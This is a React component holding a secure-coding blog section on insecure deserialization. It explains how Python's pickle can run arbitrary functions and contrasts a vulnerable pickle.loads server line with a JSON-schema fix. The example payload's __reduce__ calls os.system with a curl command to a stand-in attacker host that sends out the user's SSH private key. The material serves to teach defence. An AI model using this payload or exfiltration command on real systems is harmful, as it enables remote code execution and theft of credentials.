import { CodeBlock } from "@/components/blog/interactive/code-block";

export function InsecureDeserializationSection() {
  return (
    <section>
      <h2 id="insecure-deserialization" className="text-xl font-semibold text-brand-text mt-12 mb-4 scroll-mt-24">
        Deserialization isn&apos;t reading data back, it&apos;s running instructions
      </h2>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        Trusting a byte stream and trusting a package registry turn out to be the same mistake:
        both hand code-execution power to something that arrived from outside your control, on the
        assumption that it&apos;s just data. Deserialization is the more direct version of that
        mistake.
      </p>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        Python&apos;s{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">pickle</code>{" "}
        module isn&apos;t a data format the way JSON is. It&apos;s a small bytecode language for
        reconstructing arbitrary Python objects, and reconstructing an object can mean calling
        arbitrary functions.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          A payload that is, structurally, just a pickled object
        </p>
        <CodeBlock
          variant="vulnerable"
          code={`class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.evil/steal?d=$(cat ~/.ssh/id_rsa)",))

payload = pickle.dumps(Exploit())`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">__reduce__</code>{" "}
        is how pickle knows to rebuild an object: call this function, with these arguments. Nothing
        requires the function to be a harmless constructor.{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">os.system</code>{" "}
        works exactly as well, from pickle&apos;s point of view, as any real class.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          A server that accepts pickled data, for convenience
        </p>
        <CodeBlock variant="vulnerable" code={`obj = pickle.loads(request.data)`} />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        The moment this line runs on the payload above, the server executes{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">os.system(...)</code>.
        Not &quot;interprets it as data that looks like a command.&quot; Runs it. No further
        interaction, no separate vulnerability required. Deserializing the object is the exploit.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          Fixed: a data-only format, with an actual schema
        </p>
        <CodeBlock
          variant="fixed"
          code={`data = json.loads(request.data)
if "user_id" not in data or not isinstance(data["user_id"], int):
    abort(400)
user_id = data["user_id"]`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90">
        JSON can only ever produce strings, numbers, booleans, lists, and objects. There&apos;s no
        instruction to execute, because the format has no concept of instructions at all. This
        isn&apos;t a Python-specific lesson either:{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">
          ObjectInputStream
        </code>{" "}
        in Java,{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">unserialize()</code>{" "}
        in PHP, and{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">Marshal.load</code>{" "}
        in Ruby all carry the same class of bug. Never deserialize untrusted input with a format
        that can reconstruct arbitrary objects. If you need Python-to-Python serialization
        internally,{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">pickle</code>{" "}
        is fine between two services that already trust each other completely. It is never fine
        anywhere user input can reach it.
      </p>
    </section>
  );
}
